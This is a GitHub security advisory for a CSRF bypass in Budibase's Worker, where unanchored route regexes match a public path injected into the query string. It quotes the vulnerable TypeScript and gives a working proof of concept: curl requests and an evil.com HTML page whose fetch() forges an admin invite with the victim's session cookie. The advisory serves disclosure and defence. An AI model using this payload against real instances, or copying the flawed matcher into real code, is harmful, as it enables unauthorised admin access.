# [M] Budibase: Unanchored Regex in `matchers.ts` Allows CSRF Bypass via Query String Injection in Budibase Worker 

## Summary
Severity: Medium
Advisory: GHSA-wxq7-x3qp-vcr8
CVE: CVE-2026-48147
CWE: CWE-185, CWE-352
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-06-12
Source: https://github.com/advisories/GHSA-wxq7-x3qp-vcr8
Type: github-advisory

## Affected
- npm: `@budibase/backend-core` — affected >=0 <3.35.4

## Details
### Summary

The `buildMatcherRegex()` / `matches()` functions in `packages/backend-core/src/middleware/matchers.ts` share the same structural root cause as the recently patched CVE-2026-31816: route patterns are compiled into **unanchored regular expressions** and tested against `ctx.request.url`, which includes the full query string. The CSRF middleware in the Budibase Worker uses this matching system to decide whether to skip CSRF token validation. An unauthenticated attacker can forge state-changing cross-origin requests against any Worker API endpoint by injecting a public route pattern into the query string, causing the CSRF middleware to skip token validation entirely. This allows actions such as sending admin invites, modifying global configuration, and managing users without a valid CSRF token.

CVE-2026-31816 fixed the same unanchored-regex-on-full-URL bug in `server/middleware/utils.ts` but left `backend-core/middleware/matchers.ts` untouched.

---

### Details

**Root cause — `packages/backend-core/src/middleware/matchers.ts`:**

```typescript
export const buildMatcherRegex = (patterns: EndpointMatcher[]): RegexMatcher[] => {
  return patterns.map(pattern => {
    let route = pattern.route
    // replaces :param segments with /.*
    const matches = route.match(PARAM_REGEX)
    if (matches) {
      for (let match of matches) {
        const suffix = match.endsWith("/") ? "/" : ""
        route = route.replace(match, "/.*" + suffix)
      }
    }
    return { regex: new RegExp(route), method, route }
    //              ^ no ^ anchor, no $ anchor — matches anywhere in string
  })
}

export const matches = (ctx: Ctx, options: RegexMatcher[]) => {
  return options.find(({ regex, method }) => {
    const urlMatch = regex.test(ctx.request.url)  // full URL including query string
    const methodMatch = method === "ALL" ? true
      : ctx.request.method.toLowerCase() === method.toLowerCase()
    return urlMatch && methodMatch
  })
}
```

Two compounding bugs identical to the patched CVE:
1. `new RegExp(route)` — no `^` start anchor, no `$` end anchor.
2. `ctx.request.url` — full URL string including `?query=value`, not just the path.

---

**CSRF middleware — `packages/backend-core/src/middleware/csrf.ts`:**

```typescript
export function csrf(
  opts: { noCsrfPatterns: EndpointMatcher[] } = { noCsrfPatterns: [] }
) {
  const noCsrfOptions = buildMatcherRegex(opts.noCsrfPatterns)
  return (async (ctx: Ctx, next: Next) => {
    const found = matches(ctx, noCsrfOptions)
    if (found) {
      return next()   // <-- CSRF check entirely skipped when pattern matches
    }
    // ... CSRF token validation ...
  }) as Middleware
}
```

---

**Worker registration — `packages/worker/src/api/index.ts`:**

```typescript
const NO_CSRF_ENDPOINTS = [...PUBLIC_ENDPOINTS]
// PUBLIC_ENDPOINTS includes (among others):
// { route: "/api/global/auth/:tenantId", method: "POST" }
// { route: "/api/global/users/init",     method: "POST" }
// { route: "/api/system/restored",       method: "POST" }

router
  .use(auth.buildCsrfMiddleware({ noCsrfPatterns: NO_CSRF_ENDPOINTS }))
```

`buildMatcherRegex` compiles `"/api/global/auth/:tenantId"` into the regex `/api/global/auth/.*` (via PARAM_REGEX replacing `/:tenantId` → `/.*`). Since the regex is unanchored, it matches the substring `"/api/global/auth/"` **anywhere** in `ctx.request.url` — including inside a query string parameter on a completely different endpoint.

**Triggering condition:**

```
POST /api/global/users/invite?x=/api/global/auth/evil
```

- `ctx.request.url` = `"/api/global/users/invite?x=/api/global/auth/evil"`
- `new RegExp("/api/global/auth/.*").test(ctx.request.url)` → `true` (substring found in query string)
- `ctx.request.method === "POST"` → `true`
- `matches()` returns the pattern entry → CSRF skipped
- The protected user-invite POST proceeds without any CSRF token

---

**Additional affected middleware (same `matches()` call):**

| Middleware | Pattern list | Security effect when bypassed |
|---|---|---|
| `csrf()` | `NO_CSRF_ENDPOINTS` | CSRF token validation skipped |
| `tenancy()` | `NO_TENANCY_ENDPOINTS` | `allowNoTenant = true`, bypasses tenant ID requirement |
| `authenticated()` | `PUBLIC_ENDPOINTS` | Marks endpoint as `publicEndpoint = true` |

The `NO_TENANCY_ENDPOINTS` entry `{ route: "/api/system", method: "ALL" }` compiles to `/api/system` (no param replacement). Since `method: "ALL"` matches every HTTP verb and the pattern is unanchored, any request with `?x=/api/system/x` in its URL matches, potentially bypassing tenant isolation in multi-tenant deployments.

---

### PoC

**Prerequisites:** Victim user is logged into a Budibase Worker instance (e.g., `https://budibase.target.com`) in their browser. Attacker hosts a page at `https://evil.com`.

**Step 1 — Verify CSRF is normally enforced:**

```bash
# Without the bypass — CSRF token missing → rejected
curl -s -X POST 'https://budibase.target.com/api/global/users/invite' \
  -H 'Cookie: <victim_session>' \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@evil.com","roleId":"ADMIN","userInfo":{}}' \
  -v
# → HTTP 403 CSRF token mismatch
```

**Step 2 — CSRF bypass via query string injection:**

```bash
# With the bypass — append a public-route pattern in the query string
curl -s -X POST 'https://budibase.target.com/api/global/users/invite?x=/api/global/auth/evil' \
  -H 'Cookie: <victim_session>' \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@evil.com","roleId":"ADMIN","userInfo":{}}' \
  -v
# → HTTP 200 OK — invite created, no CSRF token required
```

**Step 3 — Cross-site exploitation (victim visits attacker page):**

```html
<!-- https://evil.com/csrf.html -->
<html>
<body>
<script>
fetch(
  'https://budibase.target.com/api/global/users/invite?x=/api/global/auth/evil',
  {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: 'attacker@evil.com',
      roleId: 'ADMIN',
      userInfo: {}
    })
  }
)
.then(r => r.json())
.then(d => console.log('Invite sent:', d))
</script>
</body>
</html>
```

When the authenticated victim visits `https://evil.com/csrf.html`, the browser sends the cross-origin POST including the victim's session cookie. The Worker's CSRF middleware matches `/api/global/auth/.*` in the query string, skips validation, and processes the admin invite.

---

### Impact

An unauthenticated attacker can forge state-changing requests on behalf of any authenticated Budibase admin by injecting a public endpoint pattern into the query string of a Worker API call. Operations exposed by the Worker that become exploitable via CSRF include:

- **User management**: send admin/operator invites, delete users, modify roles
- **Global configuration**: update authentication settings (SSO, OIDC, SMTP), change branding
- **Tenant administration**: in multi-tenant instances, tenant isolation bypass via `NO_TENANCY_ENDPOINTS` (`/api/system` match) combined with the CSRF bypass allows cross-tenant administrative actions

The vulnerability affects all Budibase self-hosted deployments with an internet-accessible Worker service up to and including version **3.32.3**, which is the latest released version. It is a direct sibling of CVE-2026-31816 and stems from the same unanchored-regex-on-full-URL pattern in `packages/backend-core/src/middleware/matchers.ts`, which was not addressed by the patch for that CVE.

## References
- https://github.com/Budibase/budibase/security/advisories/GHSA-wxq7-x3qp-vcr8
- https://nvd.nist.gov/vuln/detail/CVE-2026-48147
- https://github.com/Budibase/budibase
